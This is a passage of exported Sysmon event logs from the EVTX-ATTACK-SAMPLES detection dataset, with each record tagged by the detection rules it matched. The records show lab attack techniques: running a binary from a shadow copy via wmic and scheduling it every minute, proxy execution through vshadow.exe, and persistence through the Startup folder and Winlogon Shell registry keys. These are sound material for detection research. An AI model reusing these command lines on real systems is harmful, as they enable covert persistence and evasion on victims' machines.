ParentProcessGuid: 365ABB72-FD85-5CEB-0000-00104C0E0B00
ProcessId: 3448
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE6F-5CEB-0000-0010F4370C00
CommandLine: cmd.exe /c %%SYSTEMROOT%%\system32\wbem\wmic.exe /output:C:\Windows\TEMP\YqOMAUgO /INTERACTIVE:off /node:localhost shadowcopy call create ""ClientAccessible"", ""C:\""
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\notepad.exe
UtcTime: 2019-05-27 15:12:47.402
"
2019-05-27T15:12:47.478285+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Shadow Copies Creation Using Operating Systems Utilities;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6182,IEWIN7,"Image: C:\Windows\System32\wbem\WMIC.exe
RuleName: ''
Description: WMI Commandline Utility
TerminalSessionId: 0
ParentCommandLine: cmd.exe /c %SYSTEMROOT%\system32\wbem\wmic.exe /output:C:\Windows\TEMP\YqOMAUgO /INTERACTIVE:off /node:localhost shadowcopy call create ""ClientAccessible"", ""C:\""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3448
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443
ParentProcessGuid: 365ABB72-FE6F-5CEB-0000-0010F4370C00
ProcessId: 3344
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE6F-5CEB-0000-0010D33A0C00
CommandLine: C:\Windows\system32\wbem\wmic.exe  /output:C:\Windows\TEMP\YqOMAUgO /INTERACTIVE:off /node:localhost shadowcopy call create ""ClientAccessible"", ""C:\""
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-27 15:12:47.456
"
2019-05-27T15:12:48.655114+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Suspicious Process Parents;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6184,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\notepad.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1944
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-FD85-5CEB-0000-00104C0E0B00
ProcessId: 2412
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE70-5CEB-0000-0010385C0C00
CommandLine: 'cmd.exe /c vssadmin List Shadows| find ""Shadow Copy Volume"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\notepad.exe
UtcTime: 2019-05-27 15:12:48.644
"
2019-05-27T15:12:48.763080+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6186,IEWIN7,"Image: C:\Windows\System32\vssadmin.exe
RuleName: ''
Description: 'Command Line Interface for Microsoft® Volume Shadow Copy Service '
TerminalSessionId: 0
ParentCommandLine: 'cmd.exe /c vssadmin List Shadows| find ""Shadow Copy Volume"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2412
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=B1B1E773A7A6BA38302B345A908BB52B0F7E6394,MD5=6E248A3D528EDE43994457CF417BD665,SHA256=E09BF4D27555EC7567A598BA89CCC33667252CEF1FB0B604315EA7562D18AD10,IMPHASH=12DA878C5889D860091D0234440C2C8E
ParentProcessGuid: 365ABB72-FE70-5CEB-0000-0010385C0C00
ProcessId: 1820
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE70-5CEB-0000-0010935F0C00
CommandLine: vssadmin  List Shadows
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-27 15:12:48.698
"
2019-05-27T15:12:48.827860+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6187,IEWIN7,"Image: C:\Windows\System32\find.exe
RuleName: ''
Description: Find String (grep) Utility
TerminalSessionId: 0
ParentCommandLine: 'cmd.exe /c vssadmin List Shadows| find ""Shadow Copy Volume"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2412
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=53342581BB82420A97BF89692A4927C5CB5FF9E1,MD5=5816034B0B629756163B80838853B730,SHA256=84D9AB18A059BD31C5FF4646D14F048BDA5BDE015F4A1FB2EA51E13E49725189,IMPHASH=DB2DE2A9C5C9EE806B505EDAF37AD1DF
ParentProcessGuid: 365ABB72-FE70-5CEB-0000-0010385C0C00
ProcessId: 1796
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE70-5CEB-0000-0010D65F0C00
CommandLine: 'find  ""Shadow Copy Volume"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-27 15:12:48.709
"
2019-05-27T15:12:54.447494+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Suspicious Process Created Via Wmic.EXE;Suspicious Process Parents;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6188,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\notepad.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1944
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-FD85-5CEB-0000-00104C0E0B00
ProcessId: 2356
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE76-5CEB-0000-0010546E0C00
CommandLine: 'cmd.exe /c %%SYSTEMROOT%%\system32\wbem\wmic.exe process call create \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\notepad.exe
UtcTime: 2019-05-27 15:12:54.428
"
2019-05-27T15:12:54.544664+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Process Creation Attempt via Wmic.EXE;Shadow Copies Creation Using Operating Systems Utilities;Suspicious Process Created Via Wmic.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6190,IEWIN7,"Image: C:\Windows\System32\wbem\WMIC.exe
RuleName: ''
Description: WMI Commandline Utility
TerminalSessionId: 0
ParentCommandLine: 'cmd.exe /c %SYSTEMROOT%\system32\wbem\wmic.exe process call create \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2356
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443
ParentProcessGuid: 365ABB72-FE76-5CEB-0000-0010546E0C00
ProcessId: 2840
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE76-5CEB-0000-001077710C00
CommandLine: 'C:\Windows\system32\wbem\wmic.exe  process call create \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-27 15:12:54.515
"
2019-05-27T15:12:54.632117+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6192,IEWIN7,"Image: \Device\HarddiskVolumeShadowCopy7\Windows\Temp\svhost64.exe
RuleName: ''
Description: '?'
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: '?'
Company: '?'
ParentProcessId: 3680
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=D2A54176D8E86788FB6D588919031FEF7594A79C,MD5=5779C26E8F7B3E2C9354436E0081DF67,SHA256=64F02345E342749D381F7DF34E23CE304B3292F97DE9ECE0FB6E9B55466ADF44,IMPHASH=481F47BBB2C9C21E108D65F52B04C448
ParentProcessGuid: 365ABB72-FE6C-5CEB-0000-00104A170C00
ProcessId: 1260
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE76-5CEB-0000-001015780C00
CommandLine: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe
FileVersion: '?'
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2019-05-27 15:12:54.612
"
2019-05-27T15:12:59.519768+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Suspicious Process Parents;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6193,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\notepad.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1944
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-FD85-5CEB-0000-00104C0E0B00
ProcessId: 4012
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE7B-5CEB-0000-0010867F0C00
CommandLine: 'cmd.exe /c %%SYSTEMROOT%%\system32\schtasks.exe /create /sc minute /mo 1 /tn ""eyNQLDvUSuvVPg"" /tr ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\notepad.exe
UtcTime: 2019-05-27 15:12:59.510
"
2019-05-27T15:12:59.578070+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6195,IEWIN7,"Image: C:\Windows\System32\schtasks.exe
RuleName: Persistence - Scheduled Task Management
Description: Manages scheduled tasks
TerminalSessionId: 0
ParentCommandLine: 'cmd.exe /c %SYSTEMROOT%\system32\schtasks.exe /create /sc minute /mo 1 /tn ""eyNQLDvUSuvVPg"" /tr ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4012
LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
Hashes: SHA1=8A7E8B05A122B768AB85466B2A3DAF7A358F90F4,MD5=2003E9B15E1C502B146DAD2E383AC1E3,SHA256=15018D0093BEFABBA8B927743191030D1F8C17BB97FDB48C2FC3EAB20E2D4B3D,IMPHASH=D92C80D49382091310FB8DB089F856A9
ParentProcessGuid: 365ABB72-FE7B-5CEB-0000-0010867F0C00
ProcessId: 4044
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FE7B-5CEB-0000-0010D6820C00
CommandLine: 'C:\Windows\system32\schtasks.exe  /create /sc minute /mo 1 /tn ""eyNQLDvUSuvVPg"" /tr ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-27 15:12:59.558
"
2019-05-28T02:13:52.171928+00:00,Hacktool - EDR-Freeze Execution;Proxy Execution via Vshadow;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_lolbin_bohops_vshadow_exec.evtx,1,Microsoft-Windows-Sysmon,1,6406,IEWIN7,"Image: C:\ProgramData\vshadow.exe
RuleName: ''
Description: '?'
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: '?'
Company: '?'
ParentProcessId: 2364
LogonGuid: 365ABB72-82EC-5CEC-0000-0020734A0100
Hashes: SHA1=D2C61632741A3364487FF9B7522F1A78A9D42401,MD5=B8EF7058D546B78884D469D8B710F1DF,SHA256=1D6C38894DFC5BBF8EFF3FDB11DC91722994C5294A6F576B9449AB3444A8E952,IMPHASH=DFCA9A022C377F6802C040154483A3DC
ParentProcessGuid: 365ABB72-97E9-5CEC-0000-0010095B1200
ProcessId: 2432
CurrentDirectory: c:\ProgramData\
ProcessGuid: 365ABB72-9960-5CEC-0000-0010B6981600
CommandLine: vshadow.exe  -nw -exec=c:\windows\System32\osk.exe c:\
FileVersion: '?'
User: IEWIN7\IEUser
LogonId: '0x14a73'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-28 02:13:52.155
"
2019-05-28T02:13:52.429310+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_lolbin_bohops_vshadow_exec.evtx,1,Microsoft-Windows-Sysmon,1,6408,IEWIN7,"Image: C:\Windows\System32\drvinst.exe
RuleName: Process Launched via DCOM
Description: Driver Installation Module
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 600
LogonGuid: 365ABB72-0177-5CED-0000-0020E7030000
Hashes: SHA1=2D42A8EABA2829A1641FC580DA5E337C75997A99,MD5=44DAF0A410AB80E7CAB7C12EDE5FFB34,SHA256=3493630EE740508D0DB760A7648470F2987752D9B205CCCA805A66C3524E2B58,IMPHASH=ED4425CF217058DA6BDF611263E571DD
ParentProcessGuid: 365ABB72-0178-5CED-0000-0010128B0000
ProcessId: 1968
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-9960-5CEC-0000-001082AD1600
CommandLine: DrvInst.exe ""1"" ""200"" ""STORAGE\VolumeSnapshot\HarddiskVolumeSnapshot11"" """" """" ""6350c17eb"" ""00000000"" ""000005AC"" ""00000590""
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-28 02:13:52.364
"
2019-05-28T02:13:53.507099+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_lolbin_bohops_vshadow_exec.evtx,1,Microsoft-Windows-Sysmon,1,6410,IEWIN7,"Image: C:\Windows\System32\osk.exe
RuleName: ''
Description: Accessibility On-Screen Keyboard
TerminalSessionId: 1
ParentCommandLine: utilman.exe /debug
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2856
LogonGuid: 365ABB72-82EC-5CEC-0000-0020734A0100
Hashes: SHA1=79BE9282190074A8D52F78BC34C49865111D100F,MD5=C6A991D7DF17EBD8DE4739CD1F283133,SHA256=02944492F38747CE817B851F0A8638D132F9447E7395B1574954FEAD4C9840E3,IMPHASH=F9815E29854683EF4F5A668C9D2A24F9
ParentProcessGuid: 365ABB72-9961-5CEC-0000-0010F3061700
ProcessId: 2600
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-9961-5CEC-0000-0010E1161700
CommandLine: '""C:\Windows\System32\osk.exe"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x14a73'
IntegrityLevel: High
ParentImage: C:\Windows\System32\Utilman.exe
UtcTime: 2019-05-28 02:13:53.394
"
2019-05-28T02:14:48.819881+00:00,Hacktool - EDR-Freeze Execution;Proxy Execution via Vshadow;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_lolbin_bohops_vshadow_exec.evtx,1,Microsoft-Windows-Sysmon,1,6411,IEWIN7,"Image: C:\ProgramData\vshadow.exe
RuleName: ''
Description: '?'
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: '?'
Company: '?'
ParentProcessId: 2364
LogonGuid: 365ABB72-82EC-5CEC-0000-0020734A0100
Hashes: SHA1=D2C61632741A3364487FF9B7522F1A78A9D42401,MD5=B8EF7058D546B78884D469D8B710F1DF,SHA256=1D6C38894DFC5BBF8EFF3FDB11DC91722994C5294A6F576B9449AB3444A8E952,IMPHASH=DFCA9A022C377F6802C040154483A3DC
ParentProcessGuid: 365ABB72-97E9-5CEC-0000-0010095B1200
ProcessId: 3092
CurrentDirectory: c:\ProgramData\
ProcessGuid: 365ABB72-9998-5CEC-0000-00107D501700
CommandLine: vshadow.exe  -nw -exec=c:\windows\System32\notepad.exe c:\
FileVersion: '?'
User: IEWIN7\IEUser
LogonId: '0x14a73'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-28 02:14:48.819
"
2019-05-28T02:14:49.194881+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_lolbin_bohops_vshadow_exec.evtx,1,Microsoft-Windows-Sysmon,1,6413,IEWIN7,"Image: C:\Windows\System32\drvinst.exe
RuleName: Process Launched via DCOM
Description: Driver Installation Module
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 600
LogonGuid: 365ABB72-0177-5CED-0000-0020E7030000
Hashes: SHA1=2D42A8EABA2829A1641FC580DA5E337C75997A99,MD5=44DAF0A410AB80E7CAB7C12EDE5FFB34,SHA256=3493630EE740508D0DB760A7648470F2987752D9B205CCCA805A66C3524E2B58,IMPHASH=ED4425CF217058DA6BDF611263E571DD
ParentProcessGuid: 365ABB72-0178-5CED-0000-0010128B0000
ProcessId: 1128
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-9999-5CEC-0000-0010EB5A1700
CommandLine: DrvInst.exe ""1"" ""200"" ""STORAGE\VolumeSnapshot\HarddiskVolumeSnapshot12"" """" """" ""6d110b0a3"" ""00000000"" ""000005B8"" ""000004B0""
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-28 02:14:49.077
"
2019-05-28T02:14:50.413631+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_lolbin_bohops_vshadow_exec.evtx,1,Microsoft-Windows-Sysmon,1,6414,IEWIN7,"Image: C:\Windows\System32\notepad.exe
RuleName: ''
Description: Notepad
TerminalSessionId: 1
ParentCommandLine: vshadow.exe  -nw -exec=c:\windows\System32\notepad.exe c:\
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3092
LogonGuid: 365ABB72-82EC-5CEC-0000-0020734A0100
Hashes: SHA1=FC64B1EF19E7F35642B2A2EA5F5D9F4246866243,MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B,IMPHASH=53A6715F589E88C4FD4541C81B4F57C3
ParentProcessGuid: 365ABB72-9998-5CEC-0000-00107D501700
ProcessId: 1516
CurrentDirectory: c:\ProgramData\
ProcessGuid: 365ABB72-999A-5CEC-0000-0010C3A11700
CommandLine: '""c:\windows\System32\notepad.exe""'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x14a73'
IntegrityLevel: High
ParentImage: C:\ProgramData\vshadow.exe
UtcTime: 2019-05-28 02:14:50.390
"
2019-05-28T23:09:38.589832+00:00,Modify User Shell Folders Startup Value,data/EVTX-ATTACK-SAMPLES/Persistence/persistence_startup_UserShellStartup_Folder_Changed_sysmon_13.evtx,1,Microsoft-Windows-Sysmon,13,6625,IEWIN7,"Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3583694148-1414552638-2922671848-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\startup
RuleName: Persistence - Startup User Shell Folder Modified
EventType: SetValue
ProcessId: 1520
ProcessGuid: 365ABB72-BFB2-5CED-0000-0010F2C03600
UtcTime: 2019-05-28 23:09:38.589
Details: c:\programdata\StartupNewHomeAddress
"
2019-06-14T22:22:17.988370+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx,1,Microsoft-Windows-Sysmon,1,7530,IEWIN7,"Image: C:\Users\IEUser\Downloads\a.exe
RuleName: ''
Description: NpmTaskRunner
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: NpmTaskRunner
Company: ''
ParentProcessId: 2816
LogonGuid: 365ABB72-1D89-5D04-0000-00206D330100
Hashes: SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: 365ABB72-1DB8-5D04-0000-00109BF60500
ProcessId: 4020
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-1E19-5D04-0000-0010DFC60A00
CommandLine: '""C:\Users\IEUser\Downloads\a.exe"" '
FileVersion: 1.0.0.0
User: IEWIN7\IEUser
LogonId: '0x1336d'
IntegrityLevel: High
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-06-14 22:22:17.957
"
2019-06-14T22:22:21.503995+00:00,Suspicious Double Extension Files;UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx,1,Microsoft-Windows-Sysmon,11,7531,IEWIN7,"ProcessGuid: 365ABB72-1E19-5D04-0000-0010DFC60A00
CreationUtcTime: 2019-06-14 22:22:21.503
UtcTime: 2019-06-14 22:22:21.503
ProcessId: 4020
RuleName: ''
TargetFilename: C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe
Image: C:\Users\IEUser\Downloads\a.exe
"
2019-06-14T22:22:21.535245+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx,1,Microsoft-Windows-Sysmon,1,7533,IEWIN7,"Image: C:\Users\IEUser\Downloads\a.exe
RuleName: ''
Description: NpmTaskRunner
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\Downloads\a.exe"" '
Product: NpmTaskRunner
Company: ''
ParentProcessId: 4020
LogonGuid: 365ABB72-1D89-5D04-0000-00206D330100
Hashes: SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: 365ABB72-1E19-5D04-0000-0010DFC60A00
ProcessId: 1008
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-1E1D-5D04-0000-001003E70A00
CommandLine: '""C:\Users\IEUser\Downloads\a.exe""'
FileVersion: 1.0.0.0
User: IEWIN7\IEUser
LogonId: '0x1336d'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Downloads\a.exe
UtcTime: 2019-06-14 22:22:21.535
"
2019-06-14T22:22:21.535245+00:00,CurrentVersion NT Autorun Keys Modification,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx,1,Microsoft-Windows-Sysmon,13,7532,IEWIN7,"Image: C:\Users\IEUser\Downloads\a.exe
TargetObject: HKU\S-1-5-21-3583694148-1414552638-2922671848-1000\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
RuleName: Persistence - Winlogon Shell
EventType: SetValue
ProcessId: 4020
ProcessGuid: 365ABB72-1E19-5D04-0000-0010DFC60A00
UtcTime: 2019-06-14 22:22:21.519
Details: '""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe"",explorer.exe'
"
2019-06-14T22:22:32.222745+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx,1,Microsoft-Windows-Sysmon,1,7537,IEWIN7,"Image: C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe
RuleName: ''
Description: Visual Basic Command Line Compiler
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\Downloads\a.exe""'
Product: Microsoft® Visual Studio® 2005
Company: Microsoft Corporation
ParentProcessId: 1008
LogonGuid: 365ABB72-1D89-5D04-0000-00206D330100
Hashes: SHA1=BE642993EFE69E35F3C17AC5630E8EE3958D9A1E,MD5=1672D0478049ABDAF0197BE64A7F867F,SHA256=C67F217DA287D8CEF48FA9E9DEE971D59D7EFABBD0C7F700664D7970D68B52EF,IMPHASH=5B989C7F24F9B07840E9A2A654544C93
ParentProcessGuid: 365ABB72-1E1D-5D04-0000-001003E70A00
ProcessId: 1584
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-1E28-5D04-0000-0010EC030B00
